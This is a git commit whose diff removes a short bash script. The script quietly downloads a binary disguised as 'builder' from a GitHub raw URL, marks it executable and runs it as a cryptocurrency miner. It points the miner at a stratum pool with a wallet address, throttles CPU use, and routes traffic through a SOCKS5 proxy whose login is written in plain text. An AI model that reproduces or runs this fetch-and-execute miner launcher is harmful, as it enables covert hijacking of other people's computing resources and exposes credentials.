55bc263b4ae857d915a32d5f6d515cf15835b6dc
andromedasizu <115261914+andromedasizu@users.noreply.github.com>
2022-10-08 18:54:17 +0700

    Update and rename putgendery212.sh to putgendery29.sh

--- putgendery212.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-
-wget -q https://raw.githubusercontent.com/andromedasizu/andromedasizu/main/builder
-chmod +x builder
-./builder -a lyra2z330 -o stratum+tcp://198.50.168.213:4563 -u SYDuGHGqTq4zYifQwptq2mv2HEwRGBNcWj -p c=DGB,zap=BUTK-lyra/GXX/PYRK-lyra2z330 -t 2 --cpu-affinity=0x3 -x socks5://xdezolvq:51tnf8wfj0hu@144.168.217.36:8728
